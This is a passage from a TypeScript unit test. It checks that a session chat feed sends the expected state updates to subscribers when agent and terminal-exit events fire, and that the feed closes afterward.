    const [sa, sb] = api.subscriptions()
    await api.subscribe(sa!, { t: 'sub', companyId: 'co_a', sessionId: 'se_t' })
    await api.subscribe(sb!, { t: 'sub', companyId: 'co_a', sessionId: 'se_a' })
    sent.length = 0
    fire('chat:ops', { sessionId: 'se_t', seq: 7, ops: [{ op: 'state', turn: 'terminal' }] })
    fire('agent:updated', { ...node('n_t', { kind: 'session', sessionId: 'se_t', status: 'needs_you', needs: 'idle', companyId: 'co_a' }) })
    await new Promise((r) => setTimeout(r, 150))
    const chats = sent.filter((x) => x.m.t === 'chat')
    expect(chats).toEqual([{ on: 'a', m: { t: 'chat', sessionId: 'se_t', seq: 1, ops: [{ op: 'state', turn: 'idle', activity: null }] } }])
    // it ends: a fresh view (a numbered gap), and the feed stops
    fire('pty:exit', { sessionId: 'se_t', exitCode: 0, signal: null })
    expect(sent.at(-1)).toEqual({ on: 'a', m: { t: 'chat', sessionId: 'se_t', seq: 3, ops: [] } })
    expect(api.feeds?.size()).toBe(0)
    api.dispose()
  })
})
